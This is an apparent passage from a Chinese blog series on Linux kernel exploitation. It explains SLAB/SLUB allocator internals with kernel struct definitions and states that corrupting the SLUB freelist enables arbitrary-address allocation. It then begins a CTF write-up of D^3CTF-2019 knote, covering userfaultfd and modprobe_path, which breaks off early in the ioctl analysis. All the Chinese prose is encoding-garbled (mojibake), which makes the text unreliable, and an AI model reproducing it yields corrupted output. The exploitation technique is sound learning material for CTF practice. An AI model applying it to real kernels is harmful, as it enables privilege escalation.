<p>å¯ä»¥çœ‹åˆ°ï¼Œå†å²ç‰ˆæœ¬ä¸­çš„è¯¸å¦‚<code>s_mem</code>ç­‰å…³é”®æ§åˆ¶ç»“æ„ä½“ä»<code>page</code>ç§»åˆ°äº†<code>slab</code>ä¸­ã€‚ç”±æ­¤ï¼Œ<code>page</code>ç»“æ„ä½“ä¸­ä¹Ÿå°±ä¸éœ€è¦å®šä¹‰è¿™äº›å±æ€§äº†ã€‚<code>s_mem</code>æŒ‡å‘çš„æ˜¯è¯¥SLABåˆ†é…å™¨ä¸­çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œ<code>freelist</code>æŒ‡å‘çš„æ˜¯ä¸€ä¸ªé‡è¦çš„æ ‡è¯†å¯¹è±¡ä½¿ç”¨æƒ…å†µçš„ç»“æ„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±ä¼šæåˆ°ã€‚è¿™ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€é¡µä¸­çš„ä¸åŒåœ°å€ï¼Œå…¶ä¸­å¦‚æœä¸€ä¸ª<code>page</code>è¢«ç”¨ä½œSLABåˆ†é…å™¨ï¼Œé‚£ä¹ˆå®ƒçš„<code>virtual</code>ï¼ˆ<code>page</code>ä¸­çš„æœ€åä¸€ä¸ªå±æ€§ï¼‰å±æ€§å€¼ä¸SLABä¸­çš„<code>freelist</code>æŒ‡å‘ç›¸åŒåœ°å€ã€‚</p>
<p>å…³äºSLABå†…çš„åˆ†é…æœºåˆ¶ï¼Œä»¥ä¸‹é¢ä¸€å¼ å›¾è¿›è¡Œå±•ç¤ºï¼Œå…¶ä¸­éœ€è¦æ³¨æ„çš„æ˜¯ï¼š<strong>åˆ†é…åˆ°å“ªä¸€ä¸ªå¯¹è±¡ä¸æ˜¯å¤–ç•Œèƒ½å¤Ÿå†³å®šçš„ï¼Œè€Œé‡Šæ”¾å“ªä¸€ä¸ªå¯¹è±¡æ˜¯å¤–ç•Œèƒ½å¤Ÿå†³å®šçš„</strong>ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºçš„åˆ†é…æ–¹å¼èƒ½å¤Ÿæœ€å¤§é™åº¦ä¿è¯åˆ†é…åˆ°çš„å¯¹è±¡æ˜¯æœ€è¿‘é‡Šæ”¾çš„ã€‚<strong><font color=red>åœ¨è¿›è¡Œåˆ†é…æ—¶ï¼Œactiveè¯»å–å…¶ç´¢å¼•æŒ‡å‘çš„å€¼ï¼Œå¹¶å‘å‰ç§»åŠ¨ä¸€ä½ï¼Œåœ¨è¿›è¡Œé‡Šæ”¾æ—¶ï¼Œactiveé¦–å…ˆå›é€€ä¸€ä½ï¼Œåœ¨å°†è¿™ä¸€ä½å¯¹åº”çš„ç´¢å¼•å€¼ä¿®æ”¹ä¸ºè¢«é‡Šæ”¾çš„å¯¹è±¡çš„ç´¢å¼•å€¼ã€‚</font></strong><br />
<img src="2.png" alt="" /><br />
åœ¨è¿™ç§åˆ†é…æœºåˆ¶ä¸‹ï¼Œå¾ˆå®¹æ˜“åˆ¤æ–­ä¸€ä¸ªSLABä¸­çš„å¯¹è±¡ç©¶ç«Ÿæ˜¯å…¨éƒ¨åˆ†é…ï¼Œè¿˜æ˜¯å…¨éƒ¨é‡Šæ”¾ï¼Œè¿˜æ˜¯éƒ¨åˆ†åˆ†é…ã€‚å› ä¸ºåˆ†é…å¯¹åº”ä¸€æ¬¡ç´¢å¼•å€¼å‰ç§»ï¼Œè€Œé‡Šæ”¾å¯¹åº”ä¸€æ¬¡ç´¢å¼•å€¼åç§»ï¼Œåªè¦ç´¢å¼•å€¼ä¸º0ï¼Œè¿™ä¸ªSLABå°±ä¸€å®šä¸ºç©ºï¼›åªè¦ç´¢å¼•å€¼ç­‰äºSLABä¸­å¯¹è±¡çš„ä¸ªæ•°-1ï¼Œè¿™ä¸ªSLABå°±ä¸€å®šä¸ºæ»¡ã€‚</p>
<p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å¯¹äºSLABçš„åˆ†é…æœºåˆ¶åº”è¯¥æœ‰äº†ä¸€ä¸ªåŸºæœ¬çš„è®¤è¯†ï¼Œä½†æ˜¯SLABä¸­è¿˜æœ‰ä¸€ä¸ª<strong>æŸ“è‰²</strong>çš„é—®é¢˜ã€‚æœ‰äº†ä¸Šé¢çš„ç»„ç»‡å½¢å¼ï¼ŒSLABå·²ç»èƒ½å¤Ÿä½œä¸ºä¸€ä¸ªæˆç†Ÿçš„å†…å­˜åˆ†é…å™¨äº†ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦æ·»åŠ æŸ“è‰²çš„æœºåˆ¶ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ€§èƒ½çš„è€ƒè™‘ï¼š</p>
<blockquote>
<p>æˆ‘ä»¬çŸ¥é“å†…å­˜éœ€è¦å¤„ç†æ—¶è¦å…ˆæ”¾å…¥CPUç¡¬ä»¶é«˜é€Ÿç¼“å­˜ä¸­ï¼Œè€ŒCPUç¡¬ä»¶é«˜é€Ÿç¼“å­˜ä¸å†…å­˜çš„æ˜ å°„æ–¹å¼æœ‰å¤šç§ã€‚åœ¨åŒä¸€ä¸ªkmem_cacheä¸­æ‰€æœ‰SLABéƒ½æ˜¯ç›¸åŒå¤§å°ï¼Œéƒ½æ˜¯ç›¸åŒè¿ç»­é•¿åº¦çš„é¡µæ¡†ç»„æˆï¼Œè¿™æ ·çš„è¯åœ¨ä¸åŒSLABä¸­ç›¸åŒå¯¹è±¡å·å¯¹äºé¡µæ¡†çš„é¦–åœ°å€çš„åç§»é‡ä¹Ÿç›¸åŒï¼Œè¿™æ ·æœ‰å¾ˆå¯èƒ½å¯¼è‡´ä¸åŒSLABä¸­ç›¸åŒå¯¹è±¡å·çš„å¯¹è±¡æ”¾å…¥CPUç¡¬ä»¶é«˜é€Ÿç¼“å­˜æ—¶ä¼šå¤„äºåŒä¸€è¡Œï¼Œå½“æˆ‘ä»¬äº¤æ›¿æ“ä½œè¿™ä¸¤ä¸ªå¯¹è±¡æ—¶ï¼ŒCPUçš„cacheå°±ä¼šäº¤æ›¿æ¢å…¥æ¢å‡ºï¼Œæ•ˆç‡å°±éå¸¸å·®ã€‚SLABç€è‰²å°±æ˜¯åœ¨åŒä¸€ä¸ªkmem_cacheä¸­å¯¹ä¸åŒçš„SLABæ·»åŠ ä¸€ä¸ªåç§»é‡ï¼Œå°±è®©ç›¸åŒå¯¹è±¡å·çš„å¯¹è±¡ä¸ä¼šå¯¹é½ï¼Œä¹Ÿå°±ä¸ä¼šæ”¾å…¥ç¡¬ä»¶é«˜é€Ÿç¼“å­˜çš„åŒä¸€è¡Œä¸­ï¼Œæé«˜äº†æ•ˆç‡ã€‚</p>
</blockquote>
<blockquote>
<p>ç€è‰²ç©ºé—´å°±æ˜¯å‰ç«¯çš„ç©ºé—²åŒºåŸŸï¼Œè¿™ä¸ªåŒºæœ‰å¤§å°éƒ½æ˜¯åœ¨åˆ†é…æ–°çš„SLABæ—¶è®¡ç®—å¥½çš„ï¼Œè®¡ç®—æ–¹æ³•å¾ˆç®€å•ï¼Œnodeç»“ç‚¹å¯¹åº”çš„kmem_cache_nodeä¸­çš„colour_nextä¹˜ä¸Škmem_cacheä¸­çš„colour_offå°±å¾—åˆ°äº†åç§»é‡ï¼Œç„¶åcolour_next++ï¼Œå½“colour_nextç­‰äºkmem_cacheä¸­çš„colouræ—¶ï¼Œcolour_nextå›å½’åˆ°0ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åç§»é‡ = kmem_cache.colour_off * kmem_cache.node[NODE_ID].colour_next;</span><br><span class="line"></span><br><span class="line">kmem_cache.node[NODE_ID].colour_next++;</span><br><span class="line"><span class="keyword">if</span> (kmem_cache.node[NODE_ID].colour_next == kmem_cache.colour)</span><br><span class="line">    kmem_cache.node[NODE_ID].colour_next = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="3-slubç³»ç»Ÿä»‹ç»"><a class="markdownIt-Anchor" href="#3-slubç³»ç»Ÿä»‹ç»"></a> 3. SLUBç³»ç»Ÿä»‹ç»</h1>
<p>è¯´å®Œäº†SLABï¼Œç»ˆäºå¯ä»¥å¼€å§‹æˆ‘ä»¬çš„é‡ç‚¹â€”â€”SLUBç³»ç»Ÿäº†ã€‚éƒ½è¯´SLUBç³»ç»Ÿæ˜¯SLABçš„å‡çº§ç‰ˆï¼Œé‚£ä¹ˆSLUBåˆ°åº•æ¯”SLABå‡çº§åœ¨ä»€ä¹ˆåœ°æ–¹å‘¢ï¼Ÿ</p>
<p>ç®€å•åœ°æ¥è¯´ï¼Œ<strong>é¦–å…ˆSLUBç›´æ¥åˆ æ‰äº†ä¸¤ä¸ªSLABé“¾è¡¨ï¼Œå³åœ¨SLABèŠ‚ç‚¹ä¸­è¡¨ç¤ºå…¨ç©ºå’Œå…¨æ»¡çš„å¯¹è±¡é“¾è¡¨ï¼Œåªä¿ç•™äº†ä¸€ä¸ªéƒ¨åˆ†æ»¡çš„SLABé“¾è¡¨ã€‚å…¶æ¬¡ï¼Œåœ¨<code>slab</code>ç»“æ„ä½“å†…éƒ¨ä¹Ÿæœ‰å¾ˆå¤§çš„å˜åŒ–ï¼Œåˆ å»äº†SLABä¸­æŒ‡å¼•å†…å­˜åˆ†é…çš„å…³é”®çš„æ•°ç»„ç»“æ„å’Œæè¿°ç¬¦æ•°ç»„ï¼Œè€Œåªæ˜¯ä½¿ç”¨ä¸€ä¸ªæŒ‡é’ˆå½¢æˆé“¾è¡¨ï¼Œå°†æ‰€æœ‰ç©ºé—²çš„å¯¹è±¡ä¸²è¿åœ¨ä¸€èµ·ï¼š</strong></p>
<p><img src="3.png" alt="" /><br />
ï¼ˆåŸæ–‡æ˜¯æœ‰è´´å›¾çš„ï¼Œä½†æ˜¯åœ¨ç¬”è€…çš„windowsç³»ç»Ÿä¸‹åŠ è½½ä¸å‡ºæ¥ï¼Œåœ¨ubuntuå€’æ˜¯å¯ä»¥åŠ è½½å‡ºæ¥ã€‚ä¸Šå›¾é€‰è‡ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/wh8_2011/article/details/52287557?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166522587916800182720892&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-52287557-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&amp;utm_term=slub&amp;spm=1018.2226.3001.4187">èµ„æ–™</a>ï¼‰</p>
<p>æ³¨æ„slabå’Œslubåˆ†åˆ«ä½¿ç”¨äº†ä¸åŒçš„<code>kmem_cache</code>ç»“æ„ä½“ï¼Œåˆ†åˆ«å®šä¹‰åœ¨<code>/include/linux/slab_def.h</code>å’Œ<code>/include/linux/slub_def.h</code>ä¸­ã€‚ä¸Šé¢è§£é‡ŠSLABçš„æ—¶å€™ä½¿ç”¨çš„æ˜¯<code>/include/linux/slab_def.h</code>çš„ç»“æ„ä½“ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line">	<span class="type">slab_flags_t</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;	<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset;	<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line">	<span class="comment">/* Number of per cpu partial slabs to keep around */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> cpu_partial_slabs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="type">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="type">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>åœ¨SLUBçš„<code>kmem_cache</code>ä¸­ï¼Œæœ‰ä¸€ä¸ª<code>kmem_cache_cpu</code>ç»“æ„ä½“æŒ‡é’ˆï¼Œè¿™æ˜¯SLUBåˆ†é…å™¨çš„æè¿°ç¬¦ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> **freelist;	<span class="comment">/* Pointer to next available object */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> tid;	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span>	<span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span>	<span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">local_lock_t</span> lock;	<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">	<span class="type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆå›¾ç‰‡é€‰è‡ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/whenloce/article/details/88949002?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166522587916800182720892&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-3-88949002-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&amp;utm_term=slub&amp;spm=1018.2226.3001.4187">èµ„æ–™</a>ï¼‰</p>
<p><img src="4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doZW5sb2Nl,size_16,color_FFFFFF,t_70" alt="" /><br />
å…¶ä¸­éœ€è¦é‡ç‚¹å…³æ³¨çš„å°±æ˜¯<code>freelist</code>ï¼Œé‡Œé¢ä¿å­˜çš„å°±æ˜¯å¯¹è±¡æœ¬èº«ï¼Œä»¥é“¾è¡¨è¿æ¥ã€‚åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†SLUBçš„ç»“æ„ç‰¹æ€§å®ç°äº†åˆ©ç”¨ï¼Œåœ¨é‚£é“é¢˜ä¸­ï¼Œè¯»è€…å¯ä»¥è¿›è¡Œè°ƒè¯•å‘ç°ï¼Œå¯¹è±¡å†…éƒ¨çš„å†…å®¹éå¸¸ç®€å•ï¼Œç©ºé—²çš„å¯¹è±¡å¼€å¤´8å­—èŠ‚ä¿å­˜çš„å°±æ˜¯ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡çš„åœ°å€ï¼Œä»¥é“¾è¡¨å½¢å¼è¿æ¥ï¼Œåœ¨é‡Šæ”¾ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šå°†è¯¥å¯¹è±¡æ”¾åœ¨<code>freelist</code>é“¾è¡¨å¤´éƒ¨ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåœ¨ä¸Šä¸€é¢˜ä¸­é€šè¿‡ä¿®æ”¹æŒ‡é’ˆçš„å€¼å°±å¯ä»¥è®©SLUBä¸ºæˆ‘ä»¬åˆ†é…åˆ°ä»»æ„åœ°å€äº†ã€‚<strong>åœ¨å®é™…çš„pwnåˆ©ç”¨ä¸­ï¼Œæœ‰ä¸€ä¸ªæ€è·¯å°±æ˜¯æ¶æ„ç¯¡æ”¹SLUBä¸­çš„<code>freelist</code>ï¼Œç ´åé“¾è¡¨ä»¥å®ç°ä»»æ„åœ°å€åˆ†é…ï¼Œåç»­å¯èƒ½å¯ä»¥è¿›è¡Œä»»æ„åœ°å€è¯»å†™</strong>ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-7/" class="post-title-link" itemprop="url">Kernel pwn å…¥é—¨ (7)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:33:36" itemprop="dateCreated datePublished" datetime="2023-02-28T22:33:36+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:43" itemprop="dateModified" datetime="2023-03-01T11:30:43+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>æœ¬ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ä¼šç»ƒä¹ å›é¡¾ä¸Šä¸€ç¯‡æ–‡ç« ä¸­å­¦åˆ°çš„<strong>userfaultfd</strong>åˆ©ç”¨æ–¹å¼ï¼ŒåŒæ—¶å­¦ä¹ ä¸€ç§æ–°çš„åˆ©ç”¨æ–¹å¼ï¼š<strong>modprobe_path</strong>ã€‚ä½¿ç”¨çš„ä¾‹é¢˜æ˜¯ï¼š<font color=red><strong>D^3CTF-2019 knote</strong></font>ï¼Œéœ€è¦ä¸¤ç§åˆ©ç”¨é…åˆä½¿ç”¨ã€‚ä¸‹é¢æˆ‘ä»¬å¯¹æœ¬é¢˜è¿›è¡Œåˆ†æã€‚é¢˜ç›®ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://arttnba3.cn/download/d3ctf2019/knote.7z">ä¸‹è½½</a>ã€‚å†æ¬¡æ„Ÿè°¢Arttnba3å¸ˆå‚…çš„åšå®¢ã€‚</p>
<h1 id="0x1-koæ–‡ä»¶åˆ†æ"><a class="markdownIt-Anchor" href="#0x1-koæ–‡ä»¶åˆ†æ"></a> 0x1: .koæ–‡ä»¶åˆ†æ</h1>
<p>å½“ç„¶ï¼Œåœ¨åˆ©ç”¨ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆè¿˜æ˜¯éœ€è¦å°†è¿™ä¸ªkoæ–‡ä»¶è¿‡ä¸€éã€‚</p>
<h2 id="file_operations"><a class="markdownIt-Anchor" href="#file_operations"></a> file_operations</h2>
<p><img src="1.png" alt="" /><br />
å¯ä»¥çœ‹åˆ°fopsä¸­å®šä¹‰æœ‰ioctlå‡½æ•°å’Œopenå‡½æ•°çš„å…¥å£ï¼Œå¦å¤–ç”±äºreleaseå‡½æ•°çš„èµ·å§‹åœ°å€ä¸º0ï¼Œå› æ­¤è¿™é‡Œçš„æ‰€æœ‰0éƒ½å¯ä»¥çœ‹åšreleaseå‡½æ•°å…¥å£ã€‚</p>
<h2 id="ioctl"><a class="markdownIt-Anchor" href="#ioctl"></a> ioctl</h2>
<p>åˆ†æioctlå‡½æ•°å¯çŸ¥ï¼Œä¸€å…±å®šä¹‰äº†ä»¥ä¸‹å‡ ç§å…¥å£ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=0x2333: æ‰§è¡Œgetå‡½æ•°</span><br><span class="line">cmd=0x1337: æ‰§è¡Œaddå‡½æ•°</span><br><span class="line">cmd=0x6666: æ‰§è¡Œdeleå‡½æ•°</span><br><span class="line">cmd=0x8888: æ‰§è¡Œeditå‡½æ•°</span><br></pre></td></tr></table></figure>
<h2 id="get"><a class="markdownIt-Anchor" href="#get"></a> get</h2>
<p><img src="2.png" alt="" /><br />
å‡ºç°äº†ä¸€ä¸ªmychunkçš„ä¸œè¥¿ï¼Œå› æ­¤æœ¬é¢˜å’Œå †æœ‰å…³ç³»ã€‚å‰é¢ifçš„æ„æ€åº”è¯¥æ˜¯æ‰€æœ‰chunkçš„æ•°é‡ä¸èƒ½è¶…è¿‡9ã€‚åœ¨å‡½æ•°ä¸­è¿˜å‡ºç°äº†ä¸€ä¸ª<code>copy_user_generic_unrolled</code>å‡½æ•°ï¼ŒæŸ¥çœ‹<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.3.6/source/arch/x86/lib/copy_user_64.S#L56">æºç </a>å¯çŸ¥å…¶ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯destï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯srcï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯countï¼Œå’Œ<code>copy_to_user</code>ã€<code>copy_from_user</code>åŠŸèƒ½ç›¸ä¼¼ã€‚è¿™é‡Œçœ‹åˆ°ptrå®é™…ä¸Šæ˜¯<code>get</code>å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå› æ­¤ä¹Ÿå°±æ˜¯å°†ç¬¬äºŒä¸ªå‚æ•°ï¼ˆç”¨æˆ·åœ°å€ï¼‰ä¸­çš„å†…å®¹æ‹·è´åˆ°<code>mychunk.ptr</code>ä¸­ã€‚</p>
<p><img src="3.png" alt="" /><br />
è¿™å°±æ˜¯chunkçš„ç»“æ„ï¼Œå…¶ä¸­<code>_anon_0</code>çš„åå­—å¾ˆé•¿çš„ç±»å‹æ˜¯ä¸€ä¸ªè”åˆä½“ï¼Œæœ‰<code>size</code>å’Œ<code>idx</code>ä¸¤ä¸ªç±»å‹å¯ä»¥è¡¨ç¤ºï¼Œä¸ºæ–¹ä¾¿å°†ç±»å‹åæ”¹ä¸º<code>info</code>ã€‚</p>
